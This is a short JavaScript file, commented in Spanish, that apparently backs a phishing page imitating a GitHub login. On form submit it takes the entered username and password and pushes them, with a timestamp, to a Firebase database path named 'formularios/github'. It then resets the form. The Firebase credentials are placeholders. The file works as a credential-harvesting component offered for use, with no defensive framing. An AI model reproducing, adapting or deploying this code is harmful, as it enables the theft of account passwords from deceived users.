
import { initializeApp } from "https://www.gstatic.com/firebasejs/11.8.1/firebase-app.js";
import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/11.8.1/firebase-database.js";

const firebaseConfig = {
  apiKey: "TU_API_KEY",
  authDomain: "TU_PROJECT_ID.firebaseapp.com",
  databaseURL: "https://TU_PROJECT_ID-default-rtdb.firebaseio.com",
  projectId: "TU_PROJECT_ID",
  storageBucket: "TU_PROJECT_ID.appspot.com",
  messagingSenderId: "TU_SENDER_ID",
  appId: "TU_APP_ID",
  measurementId: "G-TU_MEASUREMENT_ID" // Opcional (si usas Analytics)
};

const app = initializeApp(firebaseConfig);
const database = getDatabase(app);

document.querySelector("form").addEventListener("submit", async (e) => {
  e.preventDefault();
  
  const username = document.getElementById("username").value;
  const password = document.getElementById("password").value;

  try {
    const datosRef = ref(database, "formularios/github");
    
    const nuevoRegistro = push(datosRef);
    
    await set(nuevoRegistro, {
      usuario: username,
      contrasena: password,
      fecha: new Date().toISOString()
    });

    
    e.target.reset();

    console.log("Datos guardados");
    
  } catch (error) {
    console.error("Error al guardar en Firebase:", error);
    alert("Error técnico. Por favor intenta más tarde.");
  }
});